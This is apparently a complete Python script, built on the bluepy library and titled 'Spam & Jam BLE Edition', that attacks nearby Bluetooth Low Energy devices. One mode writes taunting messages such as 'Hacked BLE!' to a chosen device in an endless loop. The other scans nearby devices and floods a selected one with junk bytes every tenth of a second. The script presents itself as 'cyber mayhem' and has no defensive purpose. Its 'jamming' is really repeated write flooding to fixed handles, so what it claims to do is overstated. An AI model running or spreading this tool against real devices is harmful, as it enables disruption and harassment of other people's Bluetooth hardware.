import sys
import time
import random
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException

# 🎨 Cute ASCII Banner 💜
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 Spam & Jam BLE Edition 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Fun & Cyber Mayhem 🤖💥
   """)
    print("💜 XOXO Let's spam and jam! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 BLE Spamming Function
def spam_ble(target_mac):
    print(f"🚀 Spamming device {target_mac} 💥💜")
    try:
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
        peripheral.setDelegate(BLESpam())
        while True:
            spam_message = random.choice([b"Spam Attack!", b"💥💜 XOXO", b"Hacked BLE!"])
            peripheral.writeCharacteristic(0x0001, spam_message)
            print(f"💜 Spammed: {spam_message}")
            time.sleep(0.5)
    except Exception as e:
        print(f"⚠️ Error: {e}")

# 🎯 BLE Jamming Function
def jam_ble():
    print("🔎 Scanning for BLE devices to jam 📡")
    scanner = Scanner()
    devices = scanner.scan(10.0)  # Scan for 10 seconds

    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    if not devices:
        print("⚠️ No BLE devices found. Try again!")
        return

    device_idx = input("💜 Enter the index of the device to jam: ")
    try:
        device_idx = int(device_idx)
        target_device = devices[device_idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return

    print(f"💥 Jamming device {target_device} 🚀💜")
    try:
        peripheral = Peripheral(target_device)
        while True:
            junk_data = b'\x00\xFF' * 50
            peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
            print(f"🚀 Jammed {target_device} with noise 💜💥")
            time.sleep(0.1)
    except BTLEException as e:
        print(f"⚠️ Failed to jam {target_device}: {e}")

# 🏁 Main Function: Choose to Spam or Jam
def main():
    print_banner()
    print("🔹 1️⃣ Spam a BLE device 💌")
    print("🔹 2️⃣ Jam a BLE device 🚫")
    
    choice = input("💜 Choose an option (1/2): ")
    if choice == "1":
        target_mac = input("💜 Enter target BLE MAC address: ")
        spam_ble(target_mac)
    elif choice == "2":
        jam_ble()
    else:
        print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
